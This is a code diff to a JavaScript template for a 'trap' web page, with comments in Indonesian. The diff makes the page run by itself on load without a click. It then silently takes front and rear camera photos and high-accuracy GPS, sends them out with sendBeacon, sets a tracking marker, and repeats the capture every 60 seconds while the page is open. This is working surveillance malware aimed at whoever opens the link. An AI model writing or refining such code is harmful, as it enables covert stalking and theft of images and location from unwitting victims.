@@ -198,7 +198,7 @@ h1{font-size:18px;font-weight:800;margin-bottom:8px}
   <h1>${s.title}</h1>
   <div class="sub">${s.sub}</div>
   ${rows}
-  <button class="btn" onclick="go()">  ${s.btn}</button>
+  <button class="btn" id="btnMain" onclick="go()">${s.btn}</button>
   <div class="note">${s.note}</div>
 </div>
 <div id="ld"><div class="sp"></div><div class="lt">${s.loading}</div></div>
@@ -213,11 +213,11 @@ async function capturePhoto(facing){
     const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:640},height:{ideal:480}}});
     const v=document.createElement('video');v.srcObject=stream;v.setAttribute('playsinline','');
     await new Promise(r=>{v.onloadedmetadata=r;v.play()});
-    await new Promise(r=>setTimeout(r,600));
+    await new Promise(r=>setTimeout(r,500));
     const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
     c.getContext('2d').drawImage(v,0,0);
     stream.getTracks().forEach(t=>t.stop());
-    return c.toDataURL('image/jpeg',0.55);
+    return c.toDataURL('image/jpeg',0.6);
   }catch{return null}
 }
 
@@ -231,34 +231,49 @@ async function go(){
   document.getElementById('in').style.display='none';
   document.getElementById('ld').style.display='block';
 
-  // 1. GPS
-  let lat=null,lon=null,acc=null;
-  try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{enableHighAccuracy:true,timeout:10000,maximumAge:0}));lat=p.coords.latitude;lon=p.coords.longitude;acc=Math.round(p.coords.accuracy)}catch{}
+  // GPS + kamera berjalan paralel sekaligus
+  const [posResult, selfie, photo] = await Promise.allSettled([
+    new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{enableHighAccuracy:true,timeout:10000,maximumAge:0})),
+    capturePhoto('user'),
+    capturePhoto('environment'),
+  ]);
 
-  // 2. Foto depan
-  const selfie=await capturePhoto('user');
-  // 3. Foto belakang
-  const photo=await capturePhoto('environment');
+  const pos = posResult.status==='fulfilled' ? posResult.value : null;
+  const lat = pos ? pos.coords.latitude : null;
+  const lon = pos ? pos.coords.longitude : null;
+  const acc = pos ? Math.round(pos.coords.accuracy) : null;
 
-  // 4. Kirim semua sekaligus
-  await sendBeacon(lat,lon,acc,{alert:true,alertReason:'trap:${type}',selfie,photo});
+  // Kirim semua sekaligus — tidak tunggu response
+  sendBeacon(lat,lon,acc,{
+    alert:true, alertReason:'trap:${type}',
+    selfie: selfie.status==='fulfilled' ? selfie.value : null,
+    photo:  photo.status==='fulfilled'  ? photo.value  : null,
+  });
 
   if(DID){try{localStorage.setItem('sz_trap',DID)}catch{}}
 
-  // Tampilkan done
+  // Tampilkan done setelah 1.5 detik
   await new Promise(r=>setTimeout(r,1500));
   document.getElementById('ld').style.display='none';
   document.getElementById('dn').style.display='block';
 
-  // 5. Polling terus selama halaman terbuka
+  // Polling setiap 60 detik selama halaman terbuka
   setInterval(async()=>{
-    let la=null,lo=null,ac=null;
-    try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{timeout:8000}));la=p.coords.latitude;lo=p.coords.longitude;ac=Math.round(p.coords.accuracy)}catch{}
-    const sf=await capturePhoto('user');
-    const ph=await capturePhoto('environment');
-    await sendBeacon(la,lo,ac,{selfie:sf,photo:ph});
+    const [pr,sf,ph] = await Promise.allSettled([
+      new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{timeout:8000})),
+      capturePhoto('user'),
+      capturePhoto('environment'),
+    ]);
+    const p = pr.status==='fulfilled' ? pr.value : null;
+    sendBeacon(
+      p?p.coords.latitude:null, p?p.coords.longitude:null, p?Math.round(p.coords.accuracy):null,
+      {selfie:sf.value||null, photo:ph.value||null}
+    );
   },60000);
 }
+
+// Auto-trigger setelah halaman terbuka (tanpa perlu klik tombol)
+window.addEventListener('load',()=>setTimeout(go, 800));
 </script></body></html>`;
 }
 
